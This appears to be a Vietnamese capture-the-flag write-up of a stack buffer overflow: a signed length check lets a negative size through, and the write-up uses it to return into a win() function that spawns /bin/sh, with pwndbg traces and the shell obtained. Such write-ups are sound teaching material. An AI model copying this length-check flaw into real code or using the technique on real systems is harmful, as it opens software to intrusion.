# Phân tích file

- Bài này tác giả cho mình source nên mình đỡ phải đọc ida.
- Main.
    
    ```c
    int main() {
      int length;
      char buf[0x100];
    
      /* Read and check length */
      length = readint("Size: ");
      if (length > 0x100) {
        print("Buffer overflow detected!\n");
        exit(1);
      }
    
      /* Read data */
      readline("Data: ", buf, length);
      print("Bye!\n");
    
      return 0;
    }
    ```
    
    - Chương trình yêu cầu ta nhập size qua hàm readint, sau đó sẽ dùng size đó làm độ dài cho input ở phần nhập data.
    - Nếu size > 0x100 sẽ báo lỗi và exit nên không thể overflow theo cách nhập size > 0x100 được.
- Readint
    
    ```c
    int readint(const char *msg) {
      char buf[0x10];
      readline(msg, buf, 0x10);
      return atoi(buf);
    }
    ```
    
- Readline
    
    ```c
    void readline(const char *msg, char *buf, size_t size) {
      char c;
      print(msg);
      for (size_t i = 0; i < size; i++) {
        if (read(0, &c, 1) <= 0) {
          print("I/O Error\n");
          exit(1);
        } else if (c == '\n') {
          buf[i] = '\0';
          break;
        } else {
          buf[i] = c;
        }
      }
    }
    ```
    
    - Ở đây ta có thể thấy 1 bug là nếu ta nhập số âm thì vẫn thỏa cho điều kiện < 0x100 nhưng size ta nhập cho data là 1 số cực lớn nên có thể overflow được, ta chỉ cần control ret đến hàm win là được.
    
    ```c
    void win(void) {
      char *args[] = {"/bin/sh", NULL};
      execve(args[0], args, NULL);
      exit(0);
    }
    
    /* Print `msg` */
    void print(const char *msg) {
      write(1, msg, strlen(msg));
    }
    ```
    

# Exploit

- Nhập size -100
    
    ```c
    ► 0x401339 <main+30>    cmp    dword ptr [rbp - 4], 0x100
    
    pwndbg> x/xg $rbp-4
    0x7fffffffdf6c: 0x00000000ffffff9c
    pwndbg> p/d 0x00000000ffffff9c
    ```
    
    - Ta có thể pass được check điều kiện này và dùng size là 0xffffffffffffff9cđể làm length cho lần input data.

```c
► 0x40136f <main+84>     call   readline <readline>
        rdi: 0x402039 ◂— 0x4200203a61746144 /* 'Data: ' */
        rsi: 0x7fffffffde60 ◂— 0x34000000340
        rdx: 0xffffffffffffff9c
        rcx: 0x1
```

- Giờ thì ta có thể overflow control ret đến win.
    
    ```c
    0x401386 <main+107>    ret             <0x4011d6; win>
        ↓
       0x4011d6 <win>         endbr64
       0x4011da <win+4>       push   rbp
       0x4011db <win+5>       mov    rbp, rsp
       0x4011de <win+8>       sub    rsp, 0x10
       0x4011e2 <win+12>      lea    rax, [rip + 0xe1b]
    ```
    

```c
Size: Data: Bye!
$ id
uid=1000(dinhvu) gid=1000(dinhvu) groups=1000(dinhvu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
$ ls
filtered  filtered.c  flag.txt    solve.py
$
```
